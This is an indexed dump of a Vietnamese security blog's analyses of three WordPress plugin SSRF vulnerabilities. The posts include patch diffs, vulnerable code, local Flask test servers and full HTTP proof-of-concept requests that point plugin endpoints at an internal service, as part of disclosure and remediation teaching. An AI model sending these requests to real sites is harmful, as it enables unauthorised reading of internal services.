vậy, khi gửi request đến endpoint, cần truyền tham số url dưới dạng mảng, ví dụ: url[0]=\"http://example.com\" ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rfeedzy_rest_route() được đăng ký làm callback cho API trên: public function feedzy_rest_route( $data ) { $feed = $data; if ( isset( $data['feeds'] ) ) { $feed_category = $this-\u003efeedzy_sanitize_categories( $data['feeds'] ); if ( $feed_category ) { $data['url'] = $feed_category; } } if ( ! empty( $data['url'] ) ) { $feed = $data['url']; } elseif ( ! empty( $data['category'] ) ) { $feed = $data['category']; } $url = ''; if ( ! $feed instanceof \\WP_REST_Request ) { $url = $feed; } $meta_args = array( 'date_format' =\u003e get_option( 'date_format' ), 'time_format' =\u003e get_option( 'time_format' ), ); $instance = Feedzy_Rss_Feeds::instance(); $admin = $instance-\u003eget_admin(); $feed = $admin-\u003efetch_feed( $url, '12_hours', array( '' ) ); $feedy = array(); if ( ! $feed-\u003einit() ) { $feedy['error'] = __( 'Invalid Feed URL', 'feedzy-rss-feeds' ); header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) ); return $feedy; } if ( ( ! $feed-\u003eget_title() ) \u0026\u0026 ( ! $feed-\u003eget_title() ) \u0026\u0026 ( ! $feed-\u003eget_title() ) ) { $feedy['channel'] = null; } else { $feedy['channel'] = array( 'title' =\u003e ( ( $feed-\u003eget_title() ) ? $feed-\u003eget_title() : null ), 'description' =\u003e ( ( $feed-\u003eget_description() ) ? $feed-\u003eget_description() : null ), 'permalink' =\u003e ( ( $feed-\u003eget_permalink() ) ? $feed-\u003eget_permalink() : null ), ); } $feedy['items'] = array(); $items = $feed-\u003eget_items(); $is_multiple = ! empty( $feed-\u003emultifeed_url ) \u0026\u0026 is_array( $feed-\u003emultifeed_url ); foreach ( $items as $item ) { $item_attrs = apply_filters( 'feedzy_item_filter', array(), $item ); array_push( $feedy['items'], array( 'title' =\u003e ( ( $item-\u003eget_title() ) ? $item-\u003eget_title() : null ), 'link' =\u003e ( ( $item-\u003eget_permalink() ) ? $item-\u003eget_permalink() : null ), 'creator' =\u003e ( ( $item-\u003eget_author() ) ? $item-\u003eget_author()-\u003eget_name() : null ), 'source' =\u003e $is_multiple \u0026\u0026 $item-\u003eget_feed()-\u003eget_title() ? $item-\u003eget_feed()-\u003eget_title() : '', 'pubDate' =\u003e ( ( $item-\u003eget_date() ) ? $item-\u003eget_date( 'U' ) : null ), 'date' =\u003e ( ( $item-\u003eget_date() ) ? date_i18n( $meta_args['date_format'], $item-\u003eget_date( 'U' ) ) : null ), 'time' =\u003e ( ( $item-\u003eget_date() ) ? date_i18n( $meta_args['time_format'], $item-\u003eget_date( 'U' ) ) : null ), 'description' =\u003e isset( $item_attrs['item_description'] ) ? $item_attrs['item_description'] : ( $item-\u003eget_description() ? $item-\u003eget_description() : null ), 'thumbnail' =\u003e $admin-\u003efeedzy_retrieve_image( $item ), 'default_img' =\u003e apply_filters( 'feedzy_default_image', '', $url ), 'price' =\u003e isset( $item_attrs['item_price'] ) ? $item_attrs['item_price'] : null, 'media' =\u003e isset( $item_attrs['item_media'] ) ? $item_attrs['item_media'] : null, 'categories' =\u003e isset( $item_attrs['item_categories'] ) ? $item_attrs['item_categories'] : null, ) ); } header( 'Content-Type: application/json; charset=' . get_option( 'blog_charset' ) ); $output = $feedy; return $output; } Logic của hàm: Nhận và xử lý dữ liệu đầu vào $feed = $data; if ( isset( $data['feeds'] ) ) { $feed_category = $this-\u003efeedzy_sanitize_categories( $data['feeds'] ); if ( $feed_category ) { $data['url'] = $feed_category; } } Hàm kiểm tra nếu request có chứa tham số feeds, nó sẽ được làm sạch (sanitize) qua feedzy_sanitize_categories() Nếu hợp lệ, kết quả được gán lại cho $data['url']. Ưu tiên chọn nguồn dữ liệu $feed if ( ! empty( $data['url'] ) ) { $feed = $data['url']; } elseif ( ! empty( $data['category'] ) ) { $feed = $data['category']; } Nếu có url → dùng làm nguồn chính. Nếu không có url → dùng category. → Đây là nơi đầu vào người dùng (url) được chuyển tiếp sang quá trình fetch feed. Chuẩn bị biến $url $url = ''; if ( ! $feed instanceof \\WP_REST_Request ) { $url = $feed; } Nếu $feed không phải là đối tượng WP_REST_Request, nó được gán cho $url. Thực tế $feed thường là một chuỗi URL hoặc mảng URL được lấy từ request. Gọi đến core function xử lý $instance = Feedzy_Rss_Feeds::instance(); $admin = $instance-\u003eget_admin(); $feed = $admin-\u003efetch_feed( $url, '12_hours', array( '' ) );","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() → no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL → SSRF\"]\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() → no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL → SSRF\"]\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() → no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL → SSRF\"]\rgraph TD\rA[\"User input via /feedzy/v1/feed (REST API)\"] --\u003e B[\"feedzy_sanitize_feeds()\"]\rB --\u003e C[\"esc_url() → no internal host validation\"]\rC --\u003e D[\"feedzy_rest_route()\"]\rD --\u003e E[\"Feedzy_Rss_Feeds::instance()\"]\rE --\u003e F[\"$admin-\u003efetch_feed(url)\"]\rF --\u003e G{\"feedzy_amazon_get_locale_hosts() exists?\"}\rG -- No --\u003e H[\"init_feed()\"]\rH --\u003e I[\"Feedzy_Rss_Feeds_Util_SimplePie::init()\"]\rI --\u003e J[\"fetch_data(cache)\"]\rJ --\u003e K[\"HTTP request to user-controlled URL → SSRF\"]\r","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:3:3","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, request, send_from_directory, Response import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/delete', methods=['GET']) def delete(): file_id = request.args.get('id') if not file_id: return \"No id provided\", 400 print(f\"delete it: {file_id}\") return f\"Delete it: {file_id}\" @app.route('/metadata') def metadata(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) @app.route('/feed', methods=['GET']) def feed(): xml_content = \"\"\"\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003crss version=\"2.0\"\u003e \u003cchannel\u003e \u003ctitle\u003eExample Feed\u003c/title\u003e \u003clink\u003ehttps://example.com\u003c/link\u003e \u003cdescription\u003eThis is a sample RSS feed generated by Flask.\u003c/description\u003e \u003citem\u003e \u003ctitle\u003eFirst item\u003c/title\u003e \u003clink\u003ehttps://example.com/item1\u003c/link\u003e \u003cdescription\u003eHello world!\u003c/description\u003e \u003c/item\u003e \u003citem\u003e \u003ctitle\u003eSecond item\u003c/title\u003e \u003clink\u003ehttps://example.com/item2\u003c/link\u003e \u003cdescription\u003eAnother entry.\u003c/description\u003e \u003c/item\u003e \u003c/channel\u003e \u003c/rss\u003e\"\"\" return Response(xml_content, mimetype='application/xml') if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rLogin bằng tài khoản Contributor Gửi POST request với URL trỏ đến local service: POST /wp-json/feedzy/v1/feed HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-login.php?redirect_to=http%3A%2F%2Flocalhost%2Fwp-admin%2F\u0026reauth=1 Connection: keep-alive Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cdf597bffe4c239d9e871b2ac98a2d427df0fb82dc7a09099bc026fbbff641ad1; wp-settings-time-2=1761542750; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wp-settings-time-3=1761591693; wp-settings-3=mfold%3Do; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1761790291%7C0Q8NLwANiN0Uz0cgmvSAN6iBfEFzSylzkAkZn4kLcoG%7Cd42e05305965ebb0efad0d1374e9552219c641afb6452531634d3b4e414c6a48; wp_lang=en_US url[0]=http://localhost:8001/feed\u0026category=cat Result: Nội dung đọc được từ local service\rGhi chú\rNếu thử url với file không phải dạng XML, ta nhận được response: Kết quả khi file không thuộc dạng XML\r","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-11128 trong plugin Feedzy RSS Aggregator xuất phát từ việc xử lý URL không an toàn trong REST API /feedzy/v1/feed. Hàm feedzy_sanitize_feeds() chỉ dùng esc_url() mà không xác minh địa chỉ, cho phép attacker có quyền Subscriber gửi yêu cầu SSRF đến các dịch vụ nội bộ. Bản vá 5.1.1 khắc phục bằng cách sử dụng wp_http_validate_url(), thắt chặt quyền truy cập API qua current_user_can('edit_post', $post_id) và thay esc_url() bằng esc_url_raw(). ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\resc_url() không đủ để xác minh URL đầu vào. REST API cần được giới hạn quyền truy cập phù hợp. Cần xác minh và lọc URL để ngăn SSRF đến mạng nội bộ. ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Feedzy Plugin \u003c= 5.1.0 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-30","objectID":"/vi/posts/2025-10-30-cve-2025-11128/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-11128 Analysis \u0026 POC","uri":"/vi/posts/2025-10-30-cve-2025-11128/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Real Cookie Banner Plugin.","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin The Real Cookie Banner: GDPR \u0026 ePrivacy Cookie Consent cho WordPress bị lỗ hổng Server-Side Request Forgery trong tất cả các phiên bản đến và bao gồm 5.2.4. Nguyên nhân là do kiểm tra không đầy đủ URL do người dùng cung cấp tại REST API endpoint /scanner/scan-without-login. Điều này cho phép những kẻ tấn công đã xác thực, có quyền truy cập cấp administrator trở lên, thực hiện các yêu cầu web tới các địa chỉ tùy ý xuất phát từ ứng dụng web và có thể được sử dụng để truy vấn và sửa đổi thông tin từ các dịch vụ nội bộ thông qua tham số url. CVE ID: CVE-2025-12136 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 5.2.4 Patched Versions: 5.2.5 CVSS severity: Low (5.5) Required Privilege: Administrator Product: WordPress Real Cookie Banner Plugin ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Real Cookie Banner: 5.2.4 (vulnerable) và 5.2.5 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rpublic function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } Trong phiên bản lỗi, hàm routeScanWithoutLogin() nhận tham số url trực tiếp từ $request-\u003eget_param('url') và sử dụng nó ngay trong lệnh wp_remote_get() mà không có bất kỳ cơ chế kiểm tra hoặc lọc nào =\u003e Điều này dẫn đến lỗ hổng Server-Side Request Forgery (SSRF). Phần trả về đóng gói toàn bộ kết quả từ wp_remote_get($url) thành JSON: status, statusText: mã và thông điệp HTTP. ok: true nếu mã 2xx. headers: toàn bộ header của response. redirected, responseUrl: thông tin redirect nếu có. body: nội dung trả về từ URL. =\u003e Server thực chất chuyển tiếp toàn bộ phản hồi từ URL nội bộ ra ngoài, gây rò rỉ dữ liệu khi bị SSRF. public function routeScanWithoutLogin($request) { $url = $request-\u003eget_param('url'); $jobId = $request-\u003eget_param('jobId'); // Validate that the URL belongs to the jobs' domain to prevent SSRF attacks $jobDataUrl = $job-\u003edata-\u003eurl; $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } if ($checker-\u003estart($url, \\false)) { $requestArguments = $checker-\u003egetRequestArguments(); $result = \\wp_remote_get($url, ['redirection' =\u003e 0, 'cookies' =\u003e $requestArguments['cookies'], 'headers' =\u003e $requestArguments['headers'], 'timeout' =\u003e $requestArguments['timeout'], 'sslverify' =\u003e $requestArguments['sslverify']]); $status = \\wp_remote_retrieve_response_code($result); $ok = $status \u003e= 200 \u0026\u0026 $status \u003c 300; $location = \\wp_remote_retrieve_header($result, 'Location'); return new WP_REST_Response(['status' =\u003e $status, 'statusText' =\u003e \\wp_remote_retrieve_response_message($result), 'ok' =\u003e $ok, 'headers' =\u003e (object) \\wp_remote_retrieve_headers($result), 'redirected' =\u003e !empty($location), 'responseUrl' =\u003e $location, 'body' =\u003e \\wp_remote_retrieve_body($result)]); } else { return new WP_Error('rest_scan_without_login_error', 'Loopback request could not be started.'); } } Bản vá đa thêm các biện pháp xác thực đầu vào để ngăn chặn việc sử dụng URL tùy ý: Trích xuất URL hợp lệ của job hiện tại $jobDataUrl = $job-\u003edata-\u003eurl; =\u003e Lấy domain hợp lệ mà job được phép xử lý. Phân tích và xác thực cấu trúc URL do người dùng gửi lên $parsed_url = \\wp_parse_url($url); if (!$parsed_url || !isset($parsed_url['host'])) { return new WP_Error('rest_invalid_url', 'Invalid URL provided'); } =\u003e Đảm bảo URL hợp lệ, có phần host. So sánh domain hợp lệ với domain của job $current_domain = \\wp_parse_url($jobDataUrl, \\PHP_URL_HOST); if ($parsed_url['host'] !== $current_domain) { return new WP_Error('rest_invalid_domain', 'URL must belong to the jobs\\' domain'); } =\u003e Nếu domain khác, trả về lỗi thay vì tiếp tục thực hiện request. Giới hạn request chỉ trong cùng domain hợp lệ, loại bỏ khả năng SSRF đến hệ thống khác. ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:3:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable Code\rrouteScanWithoutLogin() được đăng ký làm callback cho REST API tại đường dẫn /wp-json/\u003cnamespace\u003e/scanner/scan-without-login. register_rest_route( $namespace, '/scanner/scan-without-login', [ 'methods' =\u003e 'GET', 'callback' =\u003e [$this, 'routeScanWithoutLogin'], 'permission_callback' =\u003e [$this, 'permission_callback'], 'args' =\u003e [ 'url' =\u003e [ 'type' =\u003e 'string', 'required' =\u003e true, ], 'jobId' =\u003e [ 'type' =\u003e 'number', 'required' =\u003e true, ], ], ] ); API sử dụng GET, yêu cầu hai tham số bắt buộc url (string) và jobId (number). Quyền truy cập được kiểm tra qua permission_callback(): const MANAGE_MIN_CAPABILITY = 'manage_real_cookie_banner'; public function permission_callback() { return \\current_user_can(Core::MANAGE_MIN_CAPABILITY); } manage_real_cookie_banner mặc định chỉ dành cho administrator, nên endpoint chỉ có thể gọi được bởi người dùng có quyền này. Đường dẫn đầy đủ của endpoint có thể được xác định bằng cách truy cập /wp-json và tìm từ khóa scan-without-login thay vì trace thêm logic của plugin. API chứa scan-without-login trong /wp-json\r=\u003e Endpoint chính thức của API: /wp-json/real-cookie-banner/v1/scanner/scan-without-login Ghi chú\rTừ job trong jobId tôi liên tưởng đến một công việc đang chạy và được tracking qua jobId. Tôi đặt điểm debug trong routeScanWithoutLogin() và thử chức năng, cho tất cả request đi qua proxy BurpSuite. Scanner là chức năng gọi API này. Debugger\rQuan sát trong tab HTTP history của BurpSuite thấy request đến API bị bắt và hiển thị trong HTTP History: Request đến API được bắt trong HTTP History\r","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:3:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:4:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Local Server\rTạo local service đơn giản bằng python from flask import Flask, send_from_directory import os BASE_DIR = os.path.abspath(os.getcwd()) app = Flask(__name__) @app.route('/metadata') def test(): return send_from_directory(BASE_DIR, 'metadata.json', as_attachment=True) if __name__ == '__main__': app.run(host='0.0.0.0', port=8001, debug=True) ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:4:1","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#local-server"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rSử dụng chức năng scanner và cho request đi qua proxy BurpSuite với người dùng Administrator Bắt request đến endpoint /wp-json/real-cookie-banner/v1/scanner/scan-without-login Chỉnh sửa URL và gửi: GET /wp-json/real-cookie-banner/v1/scanner/scan-without-login?_v=1761578838\u0026_locale=user\u0026url=http://localhost:8001/metadata\u0026jobId=65 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://localhost/wp-admin/admin.php?page=real-cookie-banner-component X-WP-Nonce: 83df92a708 Connection: keep-alive Cookie: wp-settings-time-2=1761542750; wordpress_test_cookie=WP%20Cookie%20check; _lscache_vary=0f9122a3a07756eeee3b4199f2c151b1; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=admin%7C1761754193%7CRyskfS8SL8JqeXoDqo9gGiN5eiEbjBx5EZ73dRIjmyt%7C19f099619d5257dcc6f5828078065f2e92c2945b71c28fea0d11612e83c42ec6; wp-settings-time-1=1761581951 Result: Nội dung đọc được từ local service\r","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:4:2","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rPhiên bản ≤ 5.2.4 của Real Cookie Banner chứa lỗ hổng SSRF tại endpoint /wp-json/real-cookie-banner/v1/scanner/scan-without-login. Hàm routeScanWithoutLogin() nhận url từ client rồi gọi wp_remote_get() và trả về nguyên vẹn body/headers, cho phép kẻ có quyền Administrator (hoặc session admin bị chiếm) đọc/tra cứu tài nguyên nội bộ. Bản 5.2.5 đã thêm kiểm tra domain (so sánh host với domain của job) để ngăn URL ngoài phạm vi và giảm nguy cơ; việc chuyển sang wp_safe_remote_get() và bổ sung kiểm tra bổ trợ là cần thiết để bảo vệ tốt hơn. ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:5:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"Key takeaways\rCập nhật plugin lên 5.2.5+ ngay lập tức. Không tin tưởng URL từ client — validate/normalize và áp allowlist domain trước khi fetch. Chặn request tới IP private/loopback sau khi resolve DNS (127.0.0.0/8, 10/8, 192.168/16, fc00::/7, v.v.). Hạn chế quyền gọi endpoint; không cấp cho tất cả user, tránh __return_true. Tránh forward credentials/cookies nội bộ; không trả nguyên header/body thô nếu không cần thiết. Dùng wp_safe_remote_get() kết hợp kiểm tra redirect, timeout, và SSL; log và giới hạn kích thước body trước khi trả về client. ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:6:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#key-takeaways"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rSSRF (Server Side Request Forgery) — Hacktrick WordPress Real Cookie Banner Plugin \u003c= 5.2.4 is vulnerable to Server Side Request Forgery (SSRF) ","date":"2025-10-29","objectID":"/vi/posts/2025-10-29-cve-2025-12136/:7:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-12136 Analysis \u0026 POC","uri":"/vi/posts/2025-10-29-cve-2025-12136/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Broken Link Notifier Plugin.","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin Broken Link Notifier cho WordPress bị lỗ hổng Server‑Side Request Forgery trong tất cả các phiên bản đến và bao gồm 1.3.0 thông qua hàm ajax_blinks() vốn cuối cùng gọi hàm check_url_status_code(). Điều này cho phép attacker chưa xác thực (unauthenticated attackers) thực hiện các yêu cầu web tới bất kỳ địa chỉ nào xuất phát từ ứng dụng web và có thể được dùng để truy vấn hoặc sửa đổi thông tin từ các dịch vụ nội bộ. CVE ID: CVE-2025-6851 Vulnerability Type: Server Side Request Forgery (SSRF) Affected Versions: \u003c= 1.3.0 Patched Versions: 1.3.1 CVSS severity: Medium (7.2) Required Privilege: Unauthenticated Product: WordPress Broken Link Notifier Plugin ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:1:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Broken Link Notifier: 1.3.0 (vulnerable) và 1.3.1 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:2:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-28","objectID":"/vi/posts/2025-10-28-cve-2025-6851/:3:0","tags":["analyst","plugin","ssrf"],"title":"CVE-2025-6851 Analysis \u0026 POC","uri":"/vi/posts/2025-10-28-cve-2025-6851/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rpublic function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } ... // Check the link $response = wp_remote_get( $link, $http_request_args ); if ( !is_wp_error( $response ) ) { $code = wp_remote_retrieve_response_code( $response ); $error = 'Unknown'; } else { $code = 0; $error = $response-\u003eget_error_message(); } } // End check_url_status_code Trong phiên bản lỗi, hàm check_url_status_code() thực hiện việc gọi wp_remote_get() trực tiếp với URL do người dùng cung cấp mà không hề kiểm tra tính hợp lệ hay mức độ an toàn của URL. Điều này tạo ra lỗ hổng SSRF (Server-Side Request Forgery). Phiên bản này không kiểm tra scheme của URL, host có hợp lệ hay không, hay IP có thuộc dải private/reserved, nên mọi request đều được thực hiện mà không có hạn chế. public function check_url_status_code( $url, $timeout = null ) { // Add the home url if ( str_starts_with( $url, '/' ) ) { $link = home_url().$url; } else { $link = $url; } // Block SSRF to private/reserved ranges $unsafe = $this-\u003eis_url_unsafe( $link ); if ( $unsafe ) { return apply_filters( 'blnotifier_status', $unsafe ); } ... // Check the link $response = wp_remote_get( 